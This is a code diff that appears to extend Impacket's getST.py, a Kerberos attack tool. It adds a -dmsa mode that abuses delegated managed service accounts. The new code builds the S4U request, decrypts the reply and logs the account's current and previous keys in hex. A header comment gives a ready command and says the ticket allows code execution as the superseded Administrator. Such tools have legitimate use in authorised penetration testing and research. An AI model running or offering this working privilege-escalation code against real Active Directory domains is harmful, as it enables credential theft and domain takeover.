@@ -31,6 +31,12 @@
 #
 #   The output of this script will be a service ticket for the Administrator user.
 #
+#   Implemented by @fulc2um: you can request a ticket for dMSA account and use it for code execution with privileges of superseded user.
+#   Microsoft documentation for setting up Delegated Managed Service Accounts (dMSA): 
+#   https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa
+#   Assume that dMSA account dmsa$ is dMSA account and Administrator is superseded account:
+#         ./getST.py -k -no-pass -impersonate dmsa$ -self -dmsa contoso.com/user
+#
 #   Once you have the ccache file, set it in the KRB5CCNAME variable and use it for fun and profit.
 #
 # Authors:
@@ -57,16 +63,17 @@ from six import ensure_binary
 
 from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
+from pyasn1.type import tag
 
 from impacket import version
 from impacket.examples import logger
 from impacket.examples.utils import parse_identity
 from impacket.krb5 import constants, types, crypto, ccache
 from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
-    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
+    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart, S4UUserID, PA_S4U_X509_USER, KERB_DMSA_KEY_PACKAGE
 from impacket.krb5.ccache import CCache, Credential
-from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype, string_to_key
-from impacket.krb5.constants import TicketFlags, encodeFlags
+from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype, string_to_key, _get_checksum_profile, Cksumtype
+from impacket.krb5.constants import TicketFlags, encodeFlags, ApplicationTagNumbers
 from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT, sendReceive
 from impacket.krb5.types import Principal, KerberosTime, Ticket
 from impacket.ntlm import compute_nthash
@@ -85,6 +92,7 @@ class GETST:
         self.__kdcHost = options.dc_ip
         self.__force_forwardable = options.force_forwardable
         self.__additional_ticket = options.additional_ticket
+        self.__dmsa = options.dmsa
         self.__saveFileName = None
         self.__no_s4u2proxy = options.no_s4u2proxy
         if options.hashes is not None:
@@ -421,34 +429,79 @@ class GETST:
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('S4UByteArray')
             hexdump(S4UByteArray)
+        
+        paencoded = None
+        padatatype = None
+        
+        if self.__dmsa:
+            nonce_value = random.getrandbits(31)
+            dmsa_flags = [2, 4] # UNCONDITIONAL_DELEGATION (bit 2) | SIGN_REPLY (bit 4)
+            encoded_flags = encodeFlags(dmsa_flags)
+            
+            s4uID = S4UUserID()
+            s4uID.setComponentByName('nonce', nonce_value)
+            seq_set(s4uID, 'cname', clientName.components_to_asn1)
+            s4uID.setComponentByName('crealm', self.__domain) 
+            s4uID.setComponentByName('options', encoded_flags)
 
-        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
-        # with the following three parameters: the session key of the TGT of
-        # the service performing the S4U2Self request, the message type value
-        # of 17, and the byte array S4UByteArray.
-        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)
+            encoded_s4uid = encoder.encode(s4uID)
+            checksum_profile = _get_checksum_profile(Cksumtype.SHA1_AES256)
+            checkSum = checksum_profile.checksum(
+                sessionKey, 
+                ApplicationTagNumbers.EncTGSRepPart.value,
+                encoded_s4uid
+            )
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('CheckSum')
+                hexdump(checkSum)
+            s4uID_tagged = S4UUserID().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))
+            s4uID_tagged.setComponentByName('nonce', nonce_value)
+            seq_set(s4uID_tagged, 'cname', clientName.components_to_asn1)
+            s4uID_tagged.setComponentByName('crealm', self.__domain) 
+            s4uID_tagged.setComponentByName('options', encoded_flags)
 
-        if logging.getLogger().level == logging.DEBUG:
-            logging.debug('CheckSum')
-            hexdump(checkSum)
+            pa_s4u_x509_user = PA_S4U_X509_USER()
+            pa_s4u_x509_user.setComponentByName('user-id', s4uID_tagged)
+            pa_s4u_x509_user['checksum'] = noValue
+            pa_s4u_x509_user['checksum']['cksumtype'] = Cksumtype.SHA1_AES256
+            pa_s4u_x509_user['checksum']['checksum'] = checkSum
 
-        paForUserEnc = PA_FOR_USER_ENC()
-        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
-        paForUserEnc['userRealm'] = self.__domain
-        paForUserEnc['cksum'] = noValue
-        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
-        paForUserEnc['cksum']['checksum'] = checkSum
-        paForUserEnc['auth-package'] = 'Kerberos'
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('Built PA_S4U_X509_USER for DMSA:')
+                print(pa_s4u_x509_user.prettyPrint())
 
-        if logging.getLogger().level == logging.DEBUG:
-            logging.debug('PA_FOR_USER_ENC')
-            print(paForUserEnc.prettyPrint())
+            padatatype = int(constants.PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
+            paencoded = encoder.encode(pa_s4u_x509_user)
+        else:
+            # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
+            # with the following three parameters: the session key of the TGT of
+            # the service performing the S4U2Self request, the message type value
+            # of 17, and the byte array S4UByteArray.
+            checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)
 
-        encodedPaForUserEnc = encoder.encode(paForUserEnc)
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('CheckSum')
+                hexdump(checkSum)
+
+            paForUserEnc = PA_FOR_USER_ENC()
+            seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
+            paForUserEnc['userRealm'] = self.__domain
+            paForUserEnc['cksum'] = noValue
+            paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
+            paForUserEnc['cksum']['checksum'] = checkSum
+            paForUserEnc['auth-package'] = 'Kerberos'
+
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('PA_FOR_USER_ENC')
+                print(paForUserEnc.prettyPrint())
+
+            encodedPaForUserEnc = encoder.encode(paForUserEnc)
+            padatatype = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
+            paencoded = encodedPaForUserEnc
 
         tgsReq['padata'][1] = noValue
-        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
-        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc
+        tgsReq['padata'][1]['padata-type'] = padatatype
+        tgsReq['padata'][1]['padata-value'] = paencoded
 
         reqBody = seq_set(tgsReq, 'req-body')
 
@@ -466,8 +519,12 @@ class GETST:
 
         if self.__no_s4u2proxy and self.__options.spn is not None:
             logging.info("When doing S4U2self only, argument -spn is ignored")
-        if self.__options.u2u:
-            serverName = Principal(self.__user, self.__domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)
+
+        if self.__dmsa:
+            serverName = Principal('krbtgt/%s' % self.__domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            logging.debug('DMSA: Targeting krbtgt/%s service (sname)' % self.__domain)            
+        elif self.__options.u2u:
+            serverName = Principal(self.__user, self.__domain.upper(), type=constants.PrincipalNameType.NT_UNKNOWN.value)
         else:
             serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)
 
@@ -494,6 +551,53 @@ class GETST:
         r = sendReceive(message, self.__domain, kdcHost)
 
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
+
+        if self.__dmsa:
+            try:
+                # Decrypt TGS-REP enc-part (Key Usage 8 - TGS_REP_EP_SESSION_KEY)
+                cipher = _enctype_table[int(tgs['enc-part']['etype'])]
+                plainText = cipher.decrypt(sessionKey, 8, tgs['enc-part']['cipher'])
+                encTgsRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
+                
+                if logging.getLogger().level == logging.DEBUG:
+                    print(encTgsRepPart.prettyPrint())
+                
+                if 'encrypted_pa_data' not in encTgsRepPart or not encTgsRepPart['encrypted_pa_data']:
+                    logging.debug('No encrypted_pa_data found - DMSA key package not present')
+                    return
+                    
+                logging.debug('Found encrypted_pa_data, searching for DMSA key package...')
+                
+                for padata_entry in encTgsRepPart['encrypted_pa_data']:
+                    padata_type = int(padata_entry['padata-type'])
+                    logging.debug('Found encrypted padata type: %d (0x%x)' % (padata_type, padata_type))
+                    
+                    if padata_type == constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
+                        dmsa_key_package = decoder.decode(
+                            padata_entry['padata-value'], 
+                            asn1Spec=KERB_DMSA_KEY_PACKAGE()
+                        )[0]
+                        dmsa_key_package.prettyPrint()
+                       
+                        logging.info('Current keys:')
+                        for key in dmsa_key_package['current-keys']:
+                            key_type = int(key['keytype'])
+                            key_value = bytes(key['keyvalue'])
+                            type_name = constants.EncryptionTypes(key_type)
+                            hex_key = hexlify(key_value).decode('utf-8')
+                            logging.info('%s:%s' % (type_name, hex_key))
+                        logging.info('Previous keys:')
+                        for key in dmsa_key_package['previous-keys']:
+                            key_type = int(key['keytype'])
+                            key_value = bytes(key['keyvalue'])
+                            type_name = constants.EncryptionTypes(key_type)
+                            hex_key = hexlify(key_value).decode('utf-8')
+                            logging.info('%s:%s' % (type_name, hex_key))
+            
+            except Exception as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
 
         if self.__no_s4u2proxy:
             return r, None, sessionKey, None
@@ -741,6 +845,7 @@ if __name__ == '__main__':
     parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the '
                                                      'service ticket will' ' be generated for')
     parser.add_argument('-altservice', action="store", help='New sname/SPN to set in the ticket')
+    parser.add_argument('-dmsa', action='store_true', help='Use DMSA (Delegated Managed Service Accounts) ')
     parser.add_argument('-impersonate', action="store", help='target username that will be impersonated (thru S4U2Self)'
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
